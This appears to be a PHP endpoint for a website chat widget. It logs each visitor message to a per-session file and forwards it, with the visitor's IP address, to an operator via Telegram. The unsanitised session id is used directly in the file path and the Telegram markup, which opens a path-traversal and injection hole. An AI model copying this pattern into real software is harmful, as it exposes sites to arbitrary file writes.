<?php
require_once __DIR__ . '/../config.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false]);
    exit;
}

$sessionId = $_POST['id'] ?? '';
$message = $_POST['message'] ?? '';

if (empty($sessionId) || empty($message)) {
    echo json_encode(['success' => false]);
    exit;
}

// Save user message to chat file
$chatFile = LOGS_DIR . $sessionId . '.chat';
$chatData = [
    'from' => 'user',
    'text' => $message,
    'time' => time()
];
file_put_contents($chatFile, json_encode($chatData) . "\n", FILE_APPEND);

// Send to Telegram
$realIp = getRealIpAddress();
$telegramMsg = "💬 <b>СООБЩЕНИЕ #" . $sessionId . "</b>\n\n";
$telegramMsg .= "📝 <i>\"" . htmlspecialchars($message) . "\"</i>\n\n";
$telegramMsg .= "🆔 ID: <code>" . $sessionId . "</code>\n";
$telegramMsg .= "🌐 IP: <code>" . $realIp . "</code>\n";
$telegramMsg .= "🕐 Время: " . date('H:i:s d.m.Y') . "\n\n";
$telegramMsg .= "━━━━━━━━━━━━━━━━━━━━\n";
$telegramMsg .= "<b>Ответить:</b> <code>" . $sessionId . " Ваше сообщение</code>";

sendTelegramMessage($telegramMsg, null);

echo json_encode(['success' => true]);


